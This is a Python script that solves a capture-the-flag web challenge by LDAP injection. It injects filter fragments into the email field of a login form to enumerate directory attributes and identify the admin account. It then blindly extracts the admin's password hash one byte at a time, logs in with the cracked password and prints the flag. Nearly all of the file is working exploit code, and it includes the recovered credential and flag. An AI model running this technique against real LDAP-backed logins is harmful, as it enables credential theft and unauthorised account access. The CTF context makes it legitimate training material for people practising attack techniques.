#!/usr/bin/python

import requests

# https://0xukn.fr/posts/writeupecw2018admyssion/

def check(value):
	BOOL = value.split('\n')[-1]
	if BOOL == "Invalid username/password !" and "Warning" not in value:
		return True
	else:
		return False

URL = "http://challs.dvc.tf:8080/"

HASH = ""

EMAIL_LIST = ["jdoe@dvctf.local", "mkoal@dvctf.local", "hmilles@dvctf.local", "mkiloa@dvctf.local"] #You can get it at http://challs.dvc.tf:8080/?action=team

ATTRIBUTE_LIST = ["cn", "mail", "userPassword", "name", "description", "anything"] #You can get it at http://challs.dvc.tf:8080/?action=team by looking in the comments

#Enumerate attributes
REAL_ATTRIBUTES = []

for attribute in ATTRIBUTE_LIST:
	r = requests.post(URL, data = {'email':'*)(%s=*' % attribute,'password':'blablabla'})
	if check(r.text):
		REAL_ATTRIBUTES.append(attribute)
	
print("Available attributes : ", REAL_ATTRIBUTES)

#Find the admin
ROLES = {}

for email in EMAIL_LIST:
	r = requests.post(URL, data = {'email':'%s)(description=sysadmin' % email,'password':'blablabla'})
	if check(r.text):
		ROLES.update({email:'admin'})
	else:
		ROLES.update({email:'user'})
	
print("Roles : ", ROLES)
ADMIN_USER = list(ROLES.keys())[list(ROLES.values()).index('admin')]
#Admin : mkiloa@dvctf.local'

#Extracting userPassword attribute (https://0xukn.fr/posts/writeupecw2018admyssion/)
CURRENT = ""
MARK = True
while MARK:
	for i in range(255):
		NEW = "\\" + ("%x" % i).zfill(2)
		r = requests.post(URL, data = {'email':'%s)(userPassword:2.5.13.18:=%s' % (ADMIN_USER, CURRENT + NEW),'password':'blablabla'})
		if check(r.text):
			if i == 00:
				MARK = False
				break
			CURRENT += "\\" + ("%x" % (i - 1)).zfill(2)
			print("Char found : ", CURRENT)
			break
			

print("Found: ", bytes.fromhex(CURRENT.replace('\\', '')).decode())

# Hash = 7b4d44357d416272327057496d72655237476a396a7065743150413d3d = {MD5}Abr2pWImreR7Gj9jpet1PA==
# After cracking on crackstation, password is Chicken123


r = requests.post(URL, data = {'email':ADMIN_USER,'password':'Chicken123'})

#Flag : dvCTF{th4nk_y0u_mR_UKN}
print(r.text.split('\n')[-2])
